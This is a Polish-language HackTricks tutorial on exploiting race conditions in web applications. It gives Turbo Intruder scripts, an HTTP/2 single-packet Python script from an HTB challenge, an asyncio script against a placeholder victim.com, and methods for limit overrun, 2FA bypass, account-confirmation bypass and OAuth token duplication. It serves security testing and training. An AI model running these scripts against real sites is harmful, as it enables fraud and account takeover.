# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Aby uzyskać dogłębne zrozumienie tej techniki, sprawdź oryginalny raport pod adresem [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Główną przeszkodą w wykorzystaniu race condition jest zapewnienie, że wiele żądań jest obsługiwanych jednocześnie, z **bardzo małą różnicą w czasie ich przetwarzania — najlepiej mniejszą niż 1ms**.

Poniżej znajdują się techniki synchronizacji żądań:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Umożliwia wysłanie dwóch żądań przez jedno połączenie TCP, zmniejszając wpływ jittera sieciowego. Jednak z powodu różnic po stronie serwera dwa żądania mogą nie wystarczyć do konsekwentnego exploita race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Pozwala na wcześniejsze wysłanie większości części 20–30 żądań, wstrzymując mały fragment, który następnie jest wysyłany jednocześnie, osiągając równoczesne dotarcie do serwera.

**Preparation for Last-Byte Sync** obejmuje:

1. Wysyłanie nagłówków i danych body z pominięciem ostatniego bajtu bez zamykania strumienia.
2. Pauza 100ms po wstępnym wysłaniu.
3. Wyłączenie TCP_NODELAY, aby wykorzystać Nagle's algorithm do grupowania końcowych ramek.
4. Pingowanie w celu rozgrzania połączenia.

Następne wysłanie wstrzymanych ramek powinno spowodować ich dotarcie w jednej paczce, co można zweryfikować za pomocą Wireshark. Ta metoda nie ma zastosowania do plików statycznych, które zazwyczaj nie biorą udziału w RC attacks.

### Adapting to Server Architecture

Zrozumienie architektury celu jest kluczowe. Front-end serwery mogą kierować żądania w różny sposób, co wpływa na opóźnienia. Prewencyjne rozgrzewanie połączeń po stronie serwera, przez nieistotne żądania, może znormalizować czasy odpowiedzi.

#### Handling Session-Based Locking

Frameworki takie jak PHP's session handler serializują żądania według sesji, co może ukrywać podatności. Użycie różnych tokenów sesji dla każdego żądania może obejść ten problem.

#### Overcoming Rate or Resource Limits

Jeśli rozgrzewanie połączenia jest nieskuteczne, celowe wywołanie opóźnień związanych z limitami szybkości lub zasobów serwerów WWW poprzez zalanie ich żądaniami wypełniającymi może ułatwić single-packet attack, wywołując po stronie serwera opóźnienie sprzyjające race condition.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Możesz wysłać żądanie do **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), możesz zmienić w żądaniu wartość, którą chcesz brute-force'ować dla **`%s`** jak w `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` i następnie wybrać **`examples/race-single-packer-attack.py`** z rozwijanego menu:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Jeśli zamierzasz **wysyłać różne wartości**, możesz zmodyfikować kod tym, który używa wordlisty ze schowka:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Jeśli strona nie obsługuje HTTP2 (tylko HTTP1.1), użyj `Engine.THREADED` lub `Engine.BURP` zamiast `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: W przypadku gdy musisz wysłać request do 1 endpoint i następnie wiele do innych endpointów, aby wywołać RCE, możesz zmienić skrypt `race-single-packet-attack.py` na coś takiego:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Jest to też dostępne w **Repeater** poprzez nową opcję '**Send group in parallel**' w Burp Suite.
- Dla **limit-overrun** możesz po prostu dodać **ten sam request 50 razy** do grupy.
- Dla **connection warming** możesz **dodać** na **początku** **grupy** kilka **requests** do jakiejś niestatycznej części serwera WWW.
- Dla **delaying** procesu **pomiędzy** przetwarzaniem **jednego requesta i drugiego** w kroku z 2 substates, możesz **dodać dodatkowe requests pomiędzy** tymi requestami.
- Dla **multi-endpoint** RC możesz zacząć wysyłać **request**, który **przechodzi do ukrytego stanu**, a następnie bezpośrednio po nim wysłać **50 requests**, które **wykorzystują ukryty stan**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Celem tego skryptu jest zmiana emaila użytkownika przy jednoczesnym ciągłym sprawdzaniu aż token weryfikacyjny nowego emaila dotrze na ostatni email (to dlatego, że w kodzie występował RC, w którym można było zmodyfikować email, ale weryfikacja była wysyłana na stary adres, ponieważ zmienna wskazująca email była już wypełniona pierwszym adresem).\
Kiedy w otrzymanych mailach znajdziemy słowo "objetivo", wiemy, że otrzymaliśmy token weryfikacyjny zmienionego emaila i kończymy atak.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: uwagi dotyczące silnika i gate'owania

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: kolejkuj wiele kopii z `gate='race1'` (lub gate'ami na próbę), które wstrzymują tail każdego requestu; `openGate('race1')` flushuje wszystkie taile razem, dzięki czemu docierają niemal jednocześnie.
- Diagnostics: negative timestamps in Turbo Intruder indicate the server responded before the request was fully sent, proving overlap. This is expected in true races.
- Connection warming: wyślij najpierw ping lub kilka nieszkodliwych requestów, aby ustabilizować timingi; opcjonalnie wyłącz `TCP_NODELAY`, aby zachęcić do batchingu finalnych frames.


### Improving Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

Zauważ, że chociaż to ulepszenie sprawia, że atak jest bardziej niezawodny w przypadkach RC wymagających setek/tysięcy pakietów docierających jednocześnie, może też napotkać ograniczenia po stronie oprogramowania. Niektóre popularne serwery HTTP, takie jak Apache, Nginx i Go, mają ścisłe ustawienie `SETTINGS_MAX_CONCURRENT_STREAMS` ustawione na 100, 128 i 250. Jednak inne, jak NodeJS i nghttp2, mają je nieograniczone.\
To zasadniczo oznacza, że Apache będzie rozważać tylko 100 HTTP connections z pojedynczego TCP connection (ograniczając ten RC attack).

You can find some examples using this tehcnique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Przed powyższym badaniem używano następujących payloadów, które po prostu próbowały wysyłać pakiety tak szybko, jak to możliwe, aby wywołać RC.

- **Repeater:** Sprawdź przykłady z poprzedniej sekcji.
- **Intruder**: Wyślij **request** do **Intruder**, ustaw **number of threads** na **30** w **Options menu**, wybierz jako payload **Null payloads** i wygeneruj **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Przekroczenie limitu / TOCTOU

To najprostszy typ race condition, gdzie **podatności** pojawiają się w miejscach, które **ograniczają liczbę razy, kiedy można wykonać jakieś działanie**. Na przykład użycie tego samego kodu rabatowego w sklepie internetowym kilka razy. Bardzo prosty przykład można znaleźć w [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) lub w [**this bug**](https://hackerone.com/reports/759247)**.**

Istnieje wiele wariantów tego typu ataku, w tym:

- Wykorzystanie karty podarunkowej wielokrotnie
- Ocenianie produktu wielokrotnie
- Wypłata lub przelew środków przekraczających saldo konta
- Ponowne użycie pojedynczego rozwiązania CAPTCHA
- Omijanie limitu anty-brute-force

### **Ukryte podstany**

Wykorzystywanie złożonych race condition często polega na wykorzystaniu krótkich okien czasu do interakcji z ukrytymi lub **niezamierzonymi podstanami maszyny**. Oto jak do tego podejść:

1. **Zidentyfikuj potencjalne ukryte podstany**
- Zacznij od zlokalizowania endpoints, które modyfikują lub wchodzą w interakcję z krytycznymi danymi, takimi jak profile użytkowników lub procesy resetowania hasła. Skoncentruj się na:
- **Storage**: Preferuj endpointy, które manipulują trwałymi danymi po stronie serwera zamiast tych obsługujących dane po stronie klienta.
- **Action**: Szukaj operacji, które zmieniają istniejące dane — są one bardziej prawdopodobne do stworzenia warunków podatnych niż operacje dodające nowe dane.
- **Keying**: Udane ataki zwykle dotyczą operacji opartych na tym samym identyfikatorze, np. nazwa użytkownika lub token resetu.
2. **Przeprowadź wstępne sondowanie**
- Przetestuj zidentyfikowane endpoints przy użyciu ataków race condition, obserwując wszelkie odchylenia od oczekiwanych rezultatów. Nieoczekiwane odpowiedzi lub zmiany w zachowaniu aplikacji mogą wskazywać na podatność.
3. **Zademonstruj podatność**
- Zawęź atak do minimalnej liczby żądań potrzebnych do wykorzystania podatności, często zaledwie dwóch. Ten krok może wymagać wielu prób lub automatyzacji ze względu na precyzyjne wyrównanie czasowe.

### Ataki wrażliwe na czas

Precyzja w synchronizacji żądań może ujawnić podatności, zwłaszcza gdy do generowania tokenów bezpieczeństwa używane są przewidywalne metody, takie jak timestamps. Na przykład generowanie tokenów resetu hasła w oparciu o timestamps może pozwolić na identyczne tokeny dla jednoczesnych żądań.

**Aby wykorzystać:**

- Użyj precyzyjnego timingu, np. single packet attack, aby wykonać równoczesne żądania resetu hasła. Identyczne tokeny wskazują na podatność.

**Przykład:**

- Zażądaj dwóch tokenów resetu hasła w tym samym czasie i porównaj je. Zgodne tokeny sugerują wadę w generowaniu tokenów.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Studium przypadków ukrytych podstanów

### Zapłać i dodaj przedmiot

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) to see how to **pay** in a store and **add an extra** item you that **won't need to pay for it**.

### Potwierdź inne adresy e-mail

Idea polega na **zweryfikowaniu adresu e-mail i jednoczesnej zmianie go na inny** aby sprawdzić, czy platforma weryfikuje nowy adres.

### Zmiana adresu e-mail na 2 adresy (oparte na cookie)

According to [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab was vulnerable to a takeover this way because it might **send** the **email verification token of one email to the other email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Ukryte stany bazy danych / Obejście potwierdzenia

Jeśli **2 różne zapisy** są używane do **dodania** **informacji** do **bazy danych**, istnieje niewielki okres czasu, w którym **tylko pierwsze dane zostały zapisane** w bazie danych. Na przykład podczas tworzenia użytkownika **nazwa użytkownika** i **hasło** mogą zostać **zapisane**, a **następnie token** do potwierdzenia nowo utworzonego konta zostaje zapisany później. To oznacza, że przez krótki czas **token do potwierdzenia konta jest null**.

Dlatego **zarejestrowanie konta i wysłanie kilku żądań z pustym tokenem** (`token=` lub `token[]=` lub inną odmianą) w celu natychmiastowego potwierdzenia konta może pozwolić na **potwierdzenie konta**, którego adresu e-mail nie kontrolujesz.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Ominięcie 2FA

Następujący pseudo-kod jest podatny na race condition, ponieważ w bardzo krótkim czasie **2FA nie jest wymuszane** podczas tworzenia sesji:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 — trwała persystencja

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Te usługi pozwalają utworzyć aplikację i uwierzytelnić użytkowników zarejestrowanych przez dostawcę. Aby to zrobić, **client** będzie musiał **permit your application** aby uzyskać dostęp do części swoich danych w obrębie **OAUth provider**.\ Czyli do tej pory to zwykłe logowanie przez google/linkedin/github..., gdzie zobaczysz stronę z komunikatem: _Aplikacja \<InsertCoolName> chce uzyskać dostęp do Twoich informacji, czy chcesz na to pozwolić?_

#### Race Condition in `authorization_code`

Problem pojawia się, gdy **zaakceptujesz to** i automatycznie wysyłany jest **`authorization_code`** do złośliwej aplikacji. Następnie ta **aplikacja nadużywa Race Condition w OAUth service provider, aby wygenerować więcej niż jedną parę AT/RT** (_Authentication Token/Refresh Token_) z **`authorization_code`** dla Twojego konta. W praktyce wykorzystuje fakt, że zgodziłeś się na dostęp aplikacji do Twoich danych, aby **utworzyć kilka kont**. Jeśli później **przestaniesz zezwalać aplikacji na dostęp do swoich danych, jedna para AT/RT zostanie usunięta, ale pozostałe nadal będą ważne.**

#### Race Condition in `Refresh Token`

Gdy uzyskasz **ważny RT**, możesz spróbować **nadużyć go, aby wygenerować kilka par AT/RT**, i **nawet jeśli użytkownik cofnie uprawnienia** dla złośliwej aplikacji, **wiele RT nadal będzie ważnych.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) znajdziesz PoC w Javie wysyłający komunikaty websocket **równolegle**, aby nadużyć **Race Conditions** także w Web Sockets.
- With Burp’s WebSocket Turbo Intruder możesz użyć silnika **THREADED**, aby uruchomić wiele połączeń WS i wysyłać payloads równolegle. Zacznij od oficjalnego przykładu i dostrój `config()` (liczba wątków) pod kątem współbieżności; często jest to bardziej niezawodne niż batchowanie na jednym połączeniu przy wyścigu stanu po stronie serwera pomiędzy handlerami WS. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
